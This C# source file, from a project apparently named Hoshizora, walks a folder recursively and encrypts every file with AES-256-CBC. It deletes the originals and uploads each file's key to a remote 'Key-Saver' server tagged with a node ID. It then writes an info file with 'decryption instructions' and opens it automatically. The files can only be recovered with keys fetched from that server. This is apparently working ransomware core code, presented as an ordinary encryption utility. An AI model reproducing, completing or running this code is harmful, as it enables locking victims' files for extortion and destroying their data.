using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace Hoshizora
{
    /// <summary>
    /// Handles file encryption/decryption with Key-Saver server integration.
    /// Files are encrypted with AES-256-CBC, keys are stored on the Key-Saver server.
    /// </summary>
    public class FileEncryption
    {
        private readonly HttpClient _http;
        private readonly string _keySaverUrl;
        private readonly string _keySaverToken;
        private readonly string _nodeId;

        public event Action<string> OnLog;

        public FileEncryption(string keySaverUrl, string keySaverToken, string nodeId)
        {
            _keySaverUrl = keySaverUrl.TrimEnd('/');
            _keySaverToken = keySaverToken;
            _nodeId = nodeId;

            _http = new HttpClient
            {
                Timeout = TimeSpan.FromSeconds(30)
            };
            _http.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _keySaverToken);
        }

        /// <summary>
        /// Encrypt all files in a folder, delete originals, upload keys to server.
        /// </summary>
        public async Task<EncryptResult> EncryptFolderAsync(string folderPath, bool recursive, CancellationToken ct = default)
        {
            if (!Directory.Exists(folderPath))
                throw new DirectoryNotFoundException(string.Format("Folder not found: {0}", folderPath));

            var searchOption = recursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly;
            var files = Directory.GetFiles(folderPath, "*", searchOption)
                .Where(f => !f.EndsWith(HoshizoraConfig.EncryptedFileExtension, StringComparison.OrdinalIgnoreCase))
                .Where(f => !Path.GetFileName(f).Equals(HoshizoraConfig.InfoFileName, StringComparison.OrdinalIgnoreCase))
                .ToList();

            int encrypted = 0, failed = 0;

            foreach (var filePath in files)
            {
                ct.ThrowIfCancellationRequested();

                try
                {
                    await EncryptFileAsync(filePath);
                    encrypted++;
                }
                catch (Exception ex)
                {
                    Log(string.Format("[ERROR] {0}: {1}", Path.GetFileName(filePath), ex.Message));
                    failed++;
                }
            }

            // Create info file with decryption instructions
            if (encrypted > 0)
            {
                CreateInfoFile(folderPath);
            }

            return new EncryptResult { Encrypted = encrypted, Failed = failed };
        }

        /// <summary>
        /// Decrypt all encrypted files in a folder, fetch keys from server, restore originals.
        /// </summary>
        public async Task<DecryptResult> DecryptFolderAsync(string folderPath, bool recursive, CancellationToken ct = default)
        {
            if (!Directory.Exists(folderPath))
                throw new DirectoryNotFoundException(string.Format("Folder not found: {0}", folderPath));

            var searchOption = recursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly;
            var files = Directory.GetFiles(folderPath, "*" + HoshizoraConfig.EncryptedFileExtension, searchOption).ToList();

            int decrypted = 0, failed = 0;

            foreach (var filePath in files)
            {
                ct.ThrowIfCancellationRequested();

                try
                {
                    await DecryptFileAsync(filePath);
                    decrypted++;
                }
                catch (Exception ex)
                {
                    Log(string.Format("[ERROR] {0}: {1}", Path.GetFileName(filePath), ex.Message));
                    failed++;
                }
            }

            return new DecryptResult { Decrypted = decrypted, Failed = failed };
        }

        /// <summary>
        /// Encrypt a single file: generate key, encrypt, save, delete original, upload key.
        /// </summary>
        private async Task EncryptFileAsync(string filePath)
        {
            string fileName = Path.GetFileName(filePath);
            Log(string.Format("Encrypting: {0}", fileName));

            // Generate random key and IV
            byte[] key = new byte[32]; // AES-256
            byte[] iv = new byte[16];  // AES block size
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(key);
                rng.GetBytes(iv);
            }

            // Read original file
            byte[] plaintext = File.ReadAllBytes(filePath);

            // Encrypt with AES-CBC
            byte[] ciphertext;
            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var encryptor = aes.CreateEncryptor())
                {
                    ciphertext = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
                }
            }

            // Compute hash for key identification
            string fileHash = ComputeSha256(ciphertext);

            // Save encrypted file: [16-byte IV][ciphertext]
            string encPath = filePath + HoshizoraConfig.EncryptedFileExtension;
            using (var fs = File.Create(encPath))
            {
                fs.Write(iv, 0, iv.Length);
                fs.Write(ciphertext, 0, ciphertext.Length);
            }

            // Upload key to Key-Saver server
            await UploadKeyAsync(fileHash, key, fileName);

            // Delete original file
            File.Delete(filePath);
            Log(string.Format("Encrypted: {0} → {1}", fileName, Path.GetFileName(encPath)));
        }

        /// <summary>
        /// Decrypt a single encrypted file: fetch key from server, decrypt, restore, delete encrypted.
        /// </summary>
        private async Task DecryptFileAsync(string encPath)
        {
            string fileName = Path.GetFileName(encPath);
            Log(string.Format("Decrypting: {0}", fileName));

            // Read encrypted file
            byte[] encData = File.ReadAllBytes(encPath);
            if (encData.Length < 17) // 16-byte IV minimum
                throw new InvalidDataException("Encrypted file too short");

            byte[] iv = new byte[16];
            byte[] ciphertext = new byte[encData.Length - 16];
            Array.Copy(encData, 0, iv, 0, 16);
            Array.Copy(encData, 16, ciphertext, 0, ciphertext.Length);

            // Compute hash to get key
            string fileHash = ComputeSha256(ciphertext);

            // Fetch key from server
            byte[] key = await FetchKeyAsync(fileHash);

            // Decrypt
            byte[] plaintext;
            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var decryptor = aes.CreateDecryptor())
                {
                    plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                }
            }

            // Restore original file (remove encrypted extension)
            string originalPath = encPath.Substring(0, encPath.Length - HoshizoraConfig.EncryptedFileExtension.Length);
            File.WriteAllBytes(originalPath, plaintext);

            // Delete encrypted file
            File.Delete(encPath);
            Log(string.Format("Decrypted: {0} → {1}", fileName, Path.GetFileName(originalPath)));
        }

        private async Task UploadKeyAsync(string fileHash, byte[] key, string fileName)
        {
            var payload = new
            {
                hash = fileHash,
                key_b64 = Convert.ToBase64String(key),
                node_id = _nodeId,
                name = fileName
            };

            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            var response = await _http.PostAsync(string.Format("{0}/keys/save", _keySaverUrl), content);

            if (!response.IsSuccessStatusCode)
            {
                string error = await response.Content.ReadAsStringAsync();
                throw new HttpRequestException(string.Format("Key upload failed: {0}", error));
            }

            Log(string.Format("Key uploaded: {0}...", fileHash.Substring(0, 16)));
        }

        private async Task<byte[]> FetchKeyAsync(string fileHash)
        {
            var response = await _http.GetAsync(string.Format("{0}/keys/get?hash={1}", _keySaverUrl, fileHash));

            if (!response.IsSuccessStatusCode)
            {
                string error = await response.Content.ReadAsStringAsync();
                throw new HttpRequestException(string.Format("Key fetch failed: {0}", error));
            }

            var json = await response.Content.ReadAsStringAsync();
            using (var doc = JsonDocument.Parse(json))
            {
                JsonElement keyEl;
                if (!doc.RootElement.TryGetProperty("key_b64", out keyEl))
                    throw new KeyNotFoundException(string.Format("Key not found for hash: {0}", fileHash));

                string keyB64 = keyEl.GetString();
                if (string.IsNullOrEmpty(keyB64))
                    throw new InvalidDataException("Empty key");

                return Convert.FromBase64String(keyB64);
            }
        }

        private static string ComputeSha256(byte[] data)
        {
            using (var sha256 = SHA256.Create())
            {
                byte[] hash = sha256.ComputeHash(data);
                return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
            }
        }

        /// <summary>
        /// Create info file with decryption instructions and open it.
        /// </summary>
        private void CreateInfoFile(string folderPath)
        {
            try
            {
                string infoPath = Path.Combine(folderPath, HoshizoraConfig.InfoFileName);
                
                // Write info file with timestamp
                string content = HoshizoraConfig.InfoFileContent + 
                    string.Format("\r\nEncryption Date: {0:yyyy-MM-dd HH:mm:ss}\r\n", DateTime.Now) +
                    string.Format("Folder: {0}\r\n", folderPath);
                
                File.WriteAllText(infoPath, content, Encoding.UTF8);
                Log(string.Format("Created info file: {0}", HoshizoraConfig.InfoFileName));
                
                // Auto-open the info file
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = infoPath,
                        UseShellExecute = true
                    });
                    Log("Opened info file for viewing");
                }
                catch (Exception ex)
                {
                    Log(string.Format("[WARNING] Could not open info file: {0}", ex.Message));
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[WARNING] Failed to create info file: {0}", ex.Message));
            }
        }

        private void Log(string msg)
        {
            if (OnLog != null)
                OnLog(msg);
        }
    }

    public struct EncryptResult
    {
        public int Encrypted;
        public int Failed;
    }

    public struct DecryptResult
    {
        public int Decrypted;
        public int Failed;
    }
}
